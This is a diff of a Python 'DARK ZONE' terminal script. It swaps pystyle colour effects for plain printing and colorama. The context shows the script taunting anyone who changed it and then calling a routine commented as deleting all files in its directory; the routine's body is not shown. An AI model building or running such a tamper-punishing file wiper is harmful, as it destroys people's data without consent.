@@ -2,7 +2,6 @@ import time
 import os
 import sys
 import pyfiglet
-from pystyle import Colors, Colorate, Anime
 from colorama import Fore, init
 
 # Initialize colorama
@@ -15,14 +14,14 @@ def print_text1():
 ⣿⣿⣿⣿⣿⠁⠄⠄⠄⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠄⠄⢺⣿⣿⣿⣿
 ⣿⣿⣿⣿⣿⡄⠄⠄⠄⠙⠻⠿⣿⣿⣿⣿⠿⠿⠛⠛⠻⣿⡄⠄⣾⣿⣿⣿⣿
 ⣿⣿⣿⣿⣿⡇⠄⠄⠁ 👁️ ⠄⢹⣿⡗⠄ 👁️ ⢄⡀⣾⢀⣿⣿⣿⣿⣿⣿
-⣿⣿⣿⣿⣿⡇⠘⠄⠄⠄⢀⡀⠄⣿⣿⣷⣤⣤⣤⣾⣿⣿⣧⢸⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⡇⠘⠄⠄⠄⢀⡀⠄⣿⣿⣷⣤⣤⣾⣿⣿⣿⣧⢸⣿⣿⣿⣿⣿
 ⣿⣿⣿⣿⣿⡇⠄⣰⣿⡿⠟⠃⠄⣿⣿⣿⣿⣿⡛⠿⢿⣿⣷⣾⣿⣿⣿⣿⣿
 ⣿⣿⣿⣿⣿⣿⡄⠈⠁⠄⠄⠄⠄⠻⠿⢛⣿⣿⠿⠂⠄⢹⢹⣿⣿⣿⣿⣿⣿
 ⣿⣿⣿⣿⣿⣿⣿⡐⠐⠄⠄⣠⣀⣀⣚⣯⣵⣶⠆⣰⠄⠞⣾⣿⣿⣿⣿⣿⣿
 ⣿⣿⣿⣿⣿⣿⣿⣷⡄⠄⠄⠈⠛⠿⠿⠿⣻⡏⢠⣿⣎⣾⣿⣿⣿⣿⣿⣿⣿
 ⣿⣿⣿⣿⣿⣿⡿⠟⠛⠄⠄⠄⠄⠄⠙⣛⣿⣿⣵⣿⡿⢹⡟⣿⣿⣿⣿⣿
     """
-    print(Colorate.Horizontal(Colors.blue_to_purple, text1))
+    print(text1)
     sys.stdout.flush()
 
 def print_text2():
@@ -39,16 +38,16 @@ def print_text2():
 ⠀⠀⠀⠀⠀⠀⠀⠈⢻⣻⣻⣷⣤⣀⣀⣀⠄⢰⡟⠀⠱⠁⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⢀⣠⣤⣻⣻⣻⣻⣦⠤⠀⠀⠊⠀⢀⡆⢠⠀⠀⠀⠀⠀
     """
-    print(Colorate.Horizontal(Colors.blue_to_purple, text2))
+    print(text2)
     sys.stdout.flush()
 
 def clear_screen():
     os.system('cls' if os.name == 'nt' else 'clear')
 
 def slow_print(text, delay=0.1):
-    # Print each character one by one with pystyle
+    # Print each character one by one with a delay
     for char in text:
-        sys.stdout.write(Colorate.Horizontal(Colors.blue_to_purple, char))
+        sys.stdout.write(char)
         sys.stdout.flush()
         time.sleep(delay)  # Adjust the speed here
     print()
@@ -62,7 +61,7 @@ def delete_all_files():
 def main():
     # Print welcome message in blue to purple (no animation) for 2 seconds
     welcome_message = "Hey WELCOME TO DARK ZONE"
-    print(Colorate.Horizontal(Colors.blue_to_purple, welcome_message))
+    print(Fore.BLUE + welcome_message)
     time.sleep(2)  # Pause for 2 seconds before proceeding
 
     # Start switching between text1 and text2
@@ -76,10 +75,10 @@ def main():
         time.sleep(0.1)
         clear_screen()
 
-    # Print message after 4 seconds, alphabet by alphabet using pystyle
+    # Print message after 4 seconds, alphabet by alphabet using colorama
     slow_print("Why you Tried to change the script? You know it don't work when you change things brother.\n")
 
-    # Slow print alphabet by alphabet using pystyle
+    # Slow print alphabet by alphabet using colorama
     slow_print("I hope you understand things now?\n")
 
     # Delete all files in the directory
@@ -89,11 +88,11 @@ def main():
     stein_art = pyfiglet.figlet_format("STEIN")
     print(Fore.RED + stein_art)  # Red color for "STEIN"
 
-    # Additional information using pystyle
+    # Additional information using colorama
     additional_info1 = "DEVELOPER : @demonpis TELEGRAM"
     additional_info2 = "CHANNEL: @kyixo TELEGRAM"
-    print(Colorate.Horizontal(Colors.blue_to_purple, additional_info1))
-    print(Colorate.Horizontal(Colors.blue_to_purple, additional_info2))
+    print(Fore.BLUE + additional_info1)
+    print(Fore.BLUE + additional_info2)
 
     time.sleep(4)  # Display STEIN and additional information for 4 seconds before exiting
 
